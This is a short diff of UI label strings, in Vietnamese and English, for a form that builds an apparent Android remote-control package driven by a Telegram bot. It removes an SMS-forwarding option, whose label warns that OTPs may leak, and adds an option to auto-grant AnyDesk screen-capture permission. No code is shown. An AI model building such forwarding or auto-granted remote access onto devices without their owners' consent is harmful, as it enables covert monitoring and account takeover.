@@ -11,8 +11,8 @@ export const STR = {
     tokenLabel: "Bot token (@BotFather)",
     chatLabel: "Chat ID",
     chatPh: "-100xxxxxxxx hoặc số User ID",
-    smsLabel:
-      "Chuyển tiếp SMS mới lên Telegram (SMS_FORWARD=1) — mặc định bật, bỏ tích để tắt. OTP có thể lộ; ROM cần cho phép đọc content://sms / kho SMS.",
+    anydeskAutoMediaLabel:
+      "Tự động cấp quyền media cho AnyDesk (PROJECT_MEDIA) — mặc định tắt, tích để bật.",
     submit: "Tải TelegramControl.zip",
     submitting: "Đang đóng gói…",
     hint:
@@ -41,8 +41,8 @@ export const STR = {
     tokenLabel: "Bot token (@BotFather)",
     chatLabel: "Chat ID",
     chatPh: "-100xxxxxxxx or numeric user ID",
-    smsLabel:
-      "Forward new SMS (SMS_FORWARD=1) — on by default, uncheck to disable. OTPs may leak; ROM must allow SMS provider / database access.",
+    anydeskAutoMediaLabel:
+      "Auto-grant AnyDesk media permission (PROJECT_MEDIA) — off by default; check to enable.",
     submit: "Download TelegramControl.zip",
     submitting: "Building ZIP…",
     hint:
